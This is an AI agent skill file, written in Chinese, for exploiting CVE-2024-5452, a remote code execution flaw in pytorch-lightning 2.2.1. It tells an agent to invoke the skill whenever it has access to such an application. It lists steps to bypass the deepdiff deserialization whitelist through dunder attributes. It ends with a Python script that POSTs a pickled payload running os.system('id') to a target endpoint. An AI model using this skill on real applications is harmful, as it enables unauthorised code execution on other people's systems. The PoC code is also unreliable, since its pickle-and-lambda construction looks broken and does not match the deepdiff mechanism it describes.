---
name: poc-pytorch_lightning-CVE-2024-5452
description: 针对 CVE-2024-5452 (pytorch_lightning 远程代码执行漏洞) 的详细分析与 PoC 触发技能。当你具备运行pytorch-lightning 2.2.1版本应用程序的访问权限时，使用此SKILL。
---
验证漏洞存在方法
    - 检查目标应用程序是否运行pytorch-lightning 2.2.1版本
    - 确认目标应用程序启用了默认的delta端点（默认启用）
    - 尝试发送包含恶意dunder属性的序列化delta对象到delta端点
    - 观察是否能够绕过白名单限制并执行任意代码

漏洞利用方法
    - 攻击者可以构造特殊的序列化delta对象，其中包含dunder属性（如`__class__`、`__globals__`等）
    - 利用deepdiff库对dunder属性管理不当的漏洞，绕过反序列化白名单限制
    - 通过构造的delta对象访问其他模块、类和实例，实现任意属性写入
    - 最终在目标系统上实现远程代码执行（RCE）
    - PoC示例（概念验证）：
      ```python
      # 注意：这是一个概念验证示例，实际利用需要根据目标环境调整
      import requests
      import pickle
      import base64
      
      # 目标pytorch-lightning应用程序的delta端点
      target_url = "http://target-app/delta-endpoint"
      
      # 构造恶意的delta对象
      class MaliciousDelta:
          def __init__(self):
              # 利用dunder属性绕过限制
              self.__class__ = type('Exploit', (), {
                  '__reduce__': lambda self: (exec, ('import os; os.system("id")',))
              })
      
      # 序列化恶意对象
      malicious_obj = MaliciousDelta()
      serialized = pickle.dumps(malicious_obj)
      encoded = base64.b64encode(serialized).decode()
      
      # 发送到目标端点
      payload = {
          "delta": encoded,
          "action": "update_state"
      }
      
      # 发送请求
      response = requests.post(target_url, json=payload)
      
      if response.status_code == 200:
          print("漏洞可能存在，需要进一步验证")
      else:
          print("请求失败或漏洞已修复")
      ```
